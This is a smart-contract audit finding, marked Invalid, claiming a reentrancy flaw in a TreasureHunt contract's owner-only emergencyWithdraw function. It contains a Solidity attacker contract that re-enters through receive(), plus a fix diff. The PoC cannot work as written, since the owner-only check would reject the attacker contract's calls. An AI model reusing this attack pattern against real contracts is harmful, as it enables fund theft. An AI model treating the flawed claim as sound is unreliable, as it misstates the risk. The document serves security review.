# Missing nonReentrant modifier on emergencyWithdraw allowing reentrancy attacks

**Judging Result:** ❌ **Invalid**

---

# Root + Impact

**Impact:** Medium **Likelihood:** Low

Scope: .../src/TreasureHunt.sol

## Description

* The normal behavior of emergencyWithdraw is to let the contract owner safely withdraw any amount of ETH to a chosen recipient address when the contract is paused (for emergency fund recovery).

* The specific issue is that the function performs an external low-level ETH transfer (.call{value}) without the nonReentrant modifier that already exists in the contract (and is used on claim()). This violates the Checks-Effects-Interactions pattern and leaves the function exposed to reentrancy.

```Solidity
// Root cause in the codebase with @> marks to highlight the relevant section
/// @notice In case of an emergency, allow the owner to send ETH to a specified address.
@> function emergencyWithdraw(address payable recipient, uint256 amount) external { // missing nonReentrant modifier
    require(paused, "THE_CONTRACT_MUST_BE_PAUSED");
    require(msg.sender == owner, "ONLY_OWNER_CAN_EMERGENCY_WITHDRAW");
    require(recipient != address(0) && recipient != address(this) && recipient != owner, "INVALID_RECIPIENT");
    require(amount > 0 && amount <= address(this).balance, "INVALID_AMOUNT"); 

    (bool sent, ) = recipient.call{value: amount}(""); // external call with no reentrancy protection
    require(sent, "ETH_TRANSFER_FAILED");

    emit EmergencyWithdraw(recipient, amount);
}
```

## Risk

**Likelihood**:

* Owner calls emergencyWithdraw while the contract is paused and passes a malicious contract as the recipient

* Owner account is compromised or tricked into interacting with a malicious recipient (social engineering / phishing)

**Impact**:

* Malicious recipient can re-enter emergencyWithdraw (or trigger other state-changing logic) before the first call completes

* Funds can be drained beyond the intended amount (or cause unexpected behavior during an emergency)

## Proof of Concept

```Solidity
// Malicious recipient contract (deployed by attacker)
contract MaliciousRecipient {
    TreasureHunt public hunt;
    uint256 public attackAmount;

    constructor(address _hunt) {
        hunt = TreasureHunt(_hunt);
    }

    // Owner (or compromised owner) will call this to start the attack
    function attack(uint256 _amount) external {
        attackAmount = _amount;
        hunt.emergencyWithdraw(payable(address(this)), _amount);
    }

    receive() external payable {
        // Re-enter the function while funds are still available
        if (address(hunt).balance >= attackAmount) {
            hunt.emergencyWithdraw(payable(address(this)), attackAmount);
        }
    }
}
```

Attack flow (for demo):

1. Deploy MaliciousRecipient pointing to TreasureHunt.
2. Pause the contract.
3. Owner calls MaliciousRecipient.attack(amount).
4. The fallback/receive re-enters emergencyWithdraw before the first transfer finishes.

## Recommended Mitigation

```diff
/// @notice In case of an emergency, allow the owner to send ETH to a specified address.
- function emergencyWithdraw(address payable recipient, uint256 amount) external {
+ function emergencyWithdraw(address payable recipient, uint256 amount) external nonReentrant {
     require(paused, "THE_CONTRACT_MUST_BE_PAUSED");
     require(msg.sender == owner, "ONLY_OWNER_CAN_EMERGENCY_WITHDRAW");
     require(recipient != address(0) && recipient != address(this) && recipient != owner, "INVALID_RECIPIENT");
     require(amount > 0 && amount <= address(this).balance, "INVALID_AMOUNT"); 

     (bool sent, ) = recipient.call{value: amount}("");
     require(sent, "ETH_TRANSFER_FAILED");

     emit EmergencyWithdraw(recipient, amount);
 }
```
The contract already implements a clean nonReentrant modifier (and locked state variable) and applies it to claim(). Adding it here is a one-line, zero-risk fix. For consistency you should also consider adding it to the withdraw() function.